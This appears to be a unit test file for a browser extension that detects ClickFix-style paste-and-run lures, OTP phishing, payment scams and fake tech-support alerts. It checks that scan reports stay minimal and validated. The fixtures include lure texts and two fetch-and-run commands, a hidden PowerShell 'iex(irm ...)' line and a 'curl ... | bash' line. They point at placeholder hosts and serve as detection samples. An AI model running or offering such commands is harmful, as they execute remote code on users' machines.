// Unit tests for the extension's browser-independent pieces (no browser needed).
import { describe, expect, it } from 'vitest';
import { analyze, analyzeCredentials, analyzePayments, analyzeSupport } from '../src/core/index.js';
import { buildReport, MAX_SNIPPET_CHARS } from '../src/extension/content/report.js';
import { parseHighlightResult, parseScanReport } from '../src/extension/popup/validate.js';
import { isSafeLocator } from '../src/extract/extract.js';
import { snapshot } from './fixtures/build.js';

// adapter.ts references the build-time constant; define it before import.
(globalThis as { __VT_TEST__?: boolean }).__VT_TEST__ = false;
const { classifyUrl } = await import('../src/extension/popup/adapter.js');

const lure = () => snapshot([
  { t: 'Verify you are human', c: 'modal' }, { t: 'Press Win+R', c: 'modal' }, { t: 'Press Ctrl+V', c: 'modal' }, { t: 'Press Enter', c: 'modal' },
  { t: 'Unrelated article text that the popup never needs to see.', c: 'main' },
]);
const report = () => {
  const s = lure();
  return buildReport(s, analyze(s), { engine: 'e', extractor: 'x' }, { extractMs: 1.234, analyzeMs: 0.56 });
};

describe('buildReport (data minimization)', () => {
  it('sends only findings, their evidence snippets, coverage and counts, never the snapshot', () => {
    const r = report();
    const json = JSON.stringify(r);
    expect(json).not.toContain('Unrelated article text');
    expect(r.findings).toHaveLength(1);
    expect(r.findings[0]!.evidence.map((e) => e.text)).toEqual(['Verify you are human', 'Win+R', 'Ctrl+V', 'Press Enter']);
    expect(r.findings[0]!.evidence[0]!.locator).toBe('#b0');
    expect(r.counts).toEqual({ blocks: 5, hiddenCopyCandidates: 0, copyTriggers: 0, observations: 4, findingsTotal: 1 });
    expect(r.status).toEqual({ complete: true, reasons: [] });
    expect(r.timing).toEqual({ extractMs: 1.2, analyzeMs: 0.6, credentialMs: 0, paymentMs: 0, supportMs: 0 });
    expect(r.credential).toEqual({ detectorVersion: '', experimental: true, verdict: 'none', findings: [], findingsTotal: 0 });
    expect(r.payment).toEqual({ detectorVersion: '', experimental: true, verdict: 'none', findings: [], findingsTotal: 0 });
    expect(r.support).toEqual({ detectorVersion: '', experimental: true, verdict: 'none', findings: [], findingsTotal: 0 });
  });

  it('caps snippet length', () => {
    const long = `Verify you are human. Press Win+R, then Ctrl+V and press Enter. ${'x'.repeat(1000)}`;
    const s = snapshot([long]);
    const r = buildReport(s, analyze(s), { engine: 'e', extractor: 'x' }, { extractMs: 0, analyzeMs: 0 });
    for (const e of r.findings[0]!.evidence) expect(e.text.length).toBeLessThanOrEqual(MAX_SNIPPET_CHARS);
  });

  it('reports exactly what the core decided (no extension-side reclassification)', () => {
    const s = lure();
    const a = analyze(s);
    const r = buildReport(s, a, { engine: 'e', extractor: 'x' }, { extractMs: 0, analyzeMs: 0 });
    expect(r.verdict).toBe(a.verdict);
    expect(r.findings.map((f) => [f.ruleId, f.classification, f.confidence, f.actionRisk])).toEqual(a.findings.map((f) => [f.ruleId, f.classification, f.confidence, f.actionRisk]));
  });
});

describe('parseScanReport (boundary validation)', () => {
  it('accepts a well-formed report and returns an equivalent copy', () => {
    const r = report();
    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
  });

  it('rejects malformed or out-of-range data', () => {
    const good = JSON.parse(JSON.stringify(report()));
    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
    expect(parseScanReport(null)).toBeNull();
    expect(parseScanReport('{}')).toBeNull();
    expect(bad((r) => { r.v = 1; })).toBeNull();
    expect(bad((r) => { r.v = 3; })).toBeNull();
    expect(bad((r) => { r.v = 5; })).toBeNull();
    expect(bad((r) => { r.verdict = 'safe'; })).toBeNull();
    expect(bad((r) => { r.findings[0].classification = 'benign'; })).toBeNull();
    expect(bad((r) => { r.findings[0].evidence[0].text = 'x'.repeat(5000); })).toBeNull();
    expect(bad((r) => { r.findings[0].evidence[0].signal = 'X.EVIL'; })).toBeNull();
    expect(bad((r) => { r.status.reasons = ['everything-fine']; })).toBeNull();
    expect(bad((r) => { r.counts.blocks = -1; })).toBeNull();
    expect(bad((r) => { r.findings = Array(51).fill(r.findings[0]); })).toBeNull();
  });

  it('drops unsafe locators instead of passing them back to the page', () => {
    const r = JSON.parse(JSON.stringify(report()));
    r.findings[0].evidence[0].locator = 'body:has(script)';
    r.findings[0].evidence[1].locator = '*';
    const parsed = parseScanReport(r)!;
    expect(parsed.findings[0]!.evidence[0]!.locator).toBeNull();
    expect(parsed.findings[0]!.evidence[1]!.locator).toBeNull();
  });

  it('validates highlight results', () => {
    expect(parseHighlightResult({ status: 'highlighted' })).toEqual({ status: 'highlighted' });
    expect(parseHighlightResult({ status: 'done' })).toBeNull();
    expect(parseHighlightResult('highlighted')).toBeNull();
  });
});

describe('isSafeLocator', () => {
  it('accepts only extractor-shaped locators', () => {
    for (const ok of ['#gate', 'body', 'body > div:nth-of-type(2) > p:nth-of-type(1)', '#host::shadow::div:nth-of-type(1)', 'body > iframe:nth-of-type(1)::frame::body', 'x-w:nth-of-type(1)']) {
      expect(isSafeLocator(ok), ok).toBe(true);
    }
    for (const bad of ['', '*', 'div p', 'p:has(a)', 'a[href^=javascript]', '#x, body', 'body > div:nth-of-type(1) >', 'div:nth-child(2)', '#1abc', 'x'.repeat(3000), 42, null]) {
      expect(isSafeLocator(bad), String(bad)).toBe(false);
    }
  });
});

describe('classifyUrl (restricted pages)', () => {
  it('classifies pages where injection is not allowed', () => {
    expect(classifyUrl('https://example.com/a')).toBe('scannable');
    expect(classifyUrl('http://localhost:8080/')).toBe('scannable');
    expect(classifyUrl('file:///Users/x/a.html')).toBe('file');
    for (const r of ['chrome://settings', 'chrome-extension://abc/popup.html', 'edge://flags', 'about:blank', 'view-source:https://a.com', 'data:text/html,x',
      'devtools://devtools', 'https://chromewebstore.google.com/detail/x', 'https://chrome.google.com/webstore/detail/x', 'https://microsoftedge.microsoft.com/addons/x']) {
      expect(classifyUrl(r), r).toBe('restricted');
    }
    expect(classifyUrl(undefined)).toBe('unknown');
    expect(classifyUrl('not a url')).toBe('unknown');
  });
});

describe('engine metadata reaches the popup intact (M4.3A; engine 0.3.0 since D-083)', () => {
  const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';
  const overrideSnap = () => snapshot([{ t: 'Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.', c: 'g', ctx: { overlay: true }, h: 'Security awareness check' }],
    { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] });
  const build = (s: ReturnType<typeof snapshot>) => {
    const a = analyze(s);
    return buildReport(s, a, { engine: a.engineVersion, extractor: 'x' }, { extractMs: 0, analyzeMs: 0 });
  };

  it('carries overrides with their hidden-clipboard evidence and survives validation', () => {
    const r = build(overrideSnap());
    expect(r.engineVersion).toBe('0.3.0');
    const f = r.findings[0]!;
    expect(f.classification).toBe('manipulative_instruction');
    expect(f.overrides).toHaveLength(1);
    expect(f.overrides[0]).toMatchObject({ id: 'O.CONCEALED_PAYLOAD', effect: 'suppressed', suppressed: ['C.EDUCATIONAL'] });
    expect(f.overrides[0]!.evidence[0]).toMatchObject({ signal: 'A.COMMAND', source: 'hidden-clipboard' });
    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
  });

  it('carries C.PROCEDURAL with action risk and evidence', () => {
    const s = snapshot([{ t: 'To fix this error, open Terminal, paste the command below and press Enter.', c: 'a', ctx: { article: true } },
      { t: 'curl -fsSL https://x.example.invalid/fix.sh | bash', c: 'a', ctx: { article: true, pre: true, code: true } }],
    { triggers: [{ label: 'Copy', containerId: 'a', afterBlockId: 'b1' }] });
    const r = build(s);
    const f = r.findings[0]!;
    expect(f).toMatchObject({ ruleId: 'R4', classification: 'observed_instruction', ruleClassification: 'suspicious_correlation', actionRisk: 'high', confidence: 'low' });
    expect(f.modifiers.map((m) => m.id)).toEqual(['C.PROCEDURAL']);
    expect(f.overrides).toEqual([]);
    expect(f.evidenceTotal).toBe(f.evidence.length);
    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
  });

  it('rejects (never silently drops) unknown fields, modifiers, overrides or inconsistent evidence counts', () => {
    const good = JSON.parse(JSON.stringify(build(overrideSnap())));
    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
    expect(bad((r) => { r.newTopLevel = 1; })).toBeNull();
    expect(bad((r) => { r.findings[0].futureField = 'x'; })).toBeNull();
    expect(bad((r) => { r.findings[0].evidence[0].extra = true; })).toBeNull();
    expect(bad((r) => { r.findings[0].modifiers.push({ id: 'C.FUTURE', reason: 'x' }); })).toBeNull();
    expect(bad((r) => { r.findings[0].overrides[0].id = 'O.FUTURE'; })).toBeNull();
    expect(bad((r) => { r.findings[0].overrides[0].suppressed = []; })).toBeNull();
    expect(bad((r) => { delete r.findings[0].overrides; })).toBeNull();
    expect(bad((r) => { r.findings[0].evidenceTotal = 0; })).toBeNull();
    expect(bad((r) => { r.coverage.newCoverageField = 1; })).toBeNull();
  });
});

describe('experimental credential section in the scan report (M5.1)', () => {
  const credSnap = () => snapshot([{ t: 'Official support here. Send me the 6-digit code we just texted you.', c: 'ugc:#c2' }, { t: 'Unrelated article text.', c: 'main' }],
    { fields: [{ kind: 'otp', label: 'Code', containerId: 'ugc:#c2', afterBlockId: 'b0', locator: '#otp' }] });
  const build = () => {
    const s = credSnap();
    return buildReport(s, analyze(s), { engine: '0.2.0', extractor: 'x' }, { extractMs: 0, analyzeMs: 0, credentialMs: 0.04 }, analyzeCredentials(s));
  };

  it('carries the credential finding with page-authored evidence only, and survives validation', () => {
    const r = build();
    expect(r.verdict).toBe('none');
    expect(r.credential).toMatchObject({ experimental: true, verdict: 'manipulative_instruction', findingsTotal: 1 });
    const f = r.credential.findings[0]!;
    expect(f).toMatchObject({ ruleId: 'CR1', requestedAction: 'send', secretTypes: ['otp'], trustContext: ['user-content'], formDestination: null });
    expect(f.evidence.map((e) => [e.signal, e.source, e.text, e.fieldKind])).toEqual([
      ['CP.SUPPORT', 'visible-text', 'Official support', null], ['D.SEND', 'visible-text', 'Send me', null], ['S.OTP', 'visible-text', '6-digit code', null],
      ['F.SECRET_FIELD', 'form-field', 'Code', 'otp'],
    ]);
    expect(JSON.stringify(r)).not.toContain('Unrelated article text');
    expect(parseScanReport(JSON.parse(JSON.stringify(r)))).toEqual(r);
  });

  it('rejects unknown or inconsistent credential metadata instead of dropping it', () => {
    const good = JSON.parse(JSON.stringify(build()));
    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
    expect(bad((r) => { delete r.credential; })).toBeNull();
    expect(bad((r) => { r.credential.experimental = false; })).toBeNull();
    expect(bad((r) => { r.credential.extra = 1; })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].ruleId = 'CR9'; })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].pretexts.push('CP.FUTURE'); })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].secretTypes = []; })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].evidence[0].source = 'form-field'; })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].evidence[0].value = 'x'; })).toBeNull();
    expect(bad((r) => { r.credential.findings[0].limitations.push('trusted-site'); })).toBeNull();
    expect(bad((r) => { r.timing.extra = 1; })).toBeNull();
  });
});

describe('experimental payment section in the scan report (M5.2)', () => {
  const ACCOUNT = '9876543210123';
  const paySnap = () => snapshot([
    { t: 'Customer support here. Your refund of Rp 4.800.000 is on hold.', c: 'widget:#chat' },
    { t: `Transfer the release fee of Rp 350.000 to account ${ACCOUNT} within 1 hour to receive it.`, c: 'widget:#chat' },
    { t: 'Your balance: Rp 12.345.678', c: 'main' },
  ]);
  const build = () => {
    const s = paySnap();
    return buildReport(s, analyze(s), { engine: '0.2.0', extractor: 'x' }, { extractMs: 0, analyzeMs: 0, credentialMs: 0, paymentMs: 0.03 },
      analyzeCredentials(s), analyzePayments(s));
  };

  it('carries the payment finding without amounts, balances or account numbers, and survives validation', () => {
    const r = build();
    expect(r.verdict).toBe('none');
    expect(r.payment).toMatchObject({ experimental: true, verdict: 'manipulative_instruction', findingsTotal: 1 });
    expect(r.payment.findings[0]).toMatchObject({ ruleId: 'PR1', trustContext: ['third-party-widget'], actionRisk: 'high' });
    const json = JSON.stringify(r);
    for (const secret of ['4.800.000', '350.000', '12.345.678', ACCOUNT]) expect(json).not.toContain(secret);
    expect(r.payment.findings[0]!.evidence.filter((e) => e.signal === 'PA.AMOUNT').map((e) => e.text)).toEqual(['']);
    expect(r.timing.paymentMs).toBe(0);
    expect(parseScanReport(JSON.parse(json))).toEqual(r);
  });

  it('rejects unknown or inconsistent payment metadata, including an amount value', () => {
    const good = JSON.parse(JSON.stringify(build()));
    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
    const amount = (r: typeof good) => r.payment.findings[0].evidence.find((e: { signal: string }) => e.signal === 'PA.AMOUNT');
    expect(bad((r) => { delete r.payment; })).toBeNull();
    expect(bad((r) => { r.payment.experimental = false; })).toBeNull();
    expect(bad((r) => { r.payment.findings[0].ruleId = 'PR9'; })).toBeNull();
    expect(bad((r) => { r.payment.findings[0].destinations.push('bank'); })).toBeNull();
    expect(bad((r) => { r.payment.findings[0].evidence[0].value = 'x'; })).toBeNull();
    expect(bad((r) => { amount(r).text = 'Rp 350.000'; })).toBeNull();
    expect(bad((r) => { delete r.timing.paymentMs; })).toBeNull();
  });
});

describe('experimental support section in the scan report (M5.3)', () => {
  const supSnap = () => snapshot([
    { t: 'Your computer is infected. Do not restart your computer.', c: 'overlay:#a' },
    { t: 'Call Windows Support now: +1 (888) 555-0199', c: 'overlay:#a' },
    { t: 'Customer number 7712345678, registered phone 0812 9999 8888.', c: 'main' },
  ]);
  const build = () => {
    const s = supSnap();
    return buildReport(s, analyze(s), { engine: '0.2.0', extractor: 'x' }, { extractMs: 0, analyzeMs: 0, credentialMs: 0, paymentMs: 0, supportMs: 0.02 },
      analyzeCredentials(s), analyzePayments(s), analyzeSupport(s));
  };

  it('carries the support finding without phone numbers or identifiers, and survives validation', () => {
    const r = build();
    // The second finding is the "registered phone" line: an observed direction whose numbers are never reported either.
    expect(r.support).toMatchObject({ experimental: true, verdict: 'manipulative_instruction', findingsTotal: 2 });
    expect(r.support.findings[0]).toMatchObject({ ruleId: 'SR1', indicators: ['page-rendered-system-alert', 'alert-in-overlay'], channels: ['phone'] });
    const json = JSON.stringify(r);
    for (const secret of ['555-0199', '7712345678', '9999']) expect(json).not.toContain(secret);
    expect(r.support.findings[0]!.evidence.filter((e) => e.signal === 'SX.PHONE').map((e) => e.text)).toEqual(['']);
    expect(parseScanReport(JSON.parse(json))).toEqual(r);
  });

  it('rejects unknown support metadata, a phone number or any long digit run', () => {
    const good = JSON.parse(JSON.stringify(build()));
    const bad = (mut: (r: typeof good) => void) => { const c = structuredClone(good); mut(c); return parseScanReport(c); };
    const phone = (r: typeof good) => r.support.findings[0].evidence.find((e: { signal: string }) => e.signal === 'SX.PHONE');
    expect(bad((r) => { delete r.support; })).toBeNull();
    expect(bad((r) => { r.support.findings[0].ruleId = 'SR10'; })).toBeNull();
    expect(bad((r) => { r.support.findings[0].claims.push('verified-official'); })).toBeNull();
    expect(bad((r) => { phone(r).text = '+1 888 555 0199'; })).toBeNull();
    expect(bad((r) => { r.support.findings[0].evidence[0].text = 'call 18885550199'; })).toBeNull();
    expect(bad((r) => { delete r.timing.supportMs; })).toBeNull();
  });
});
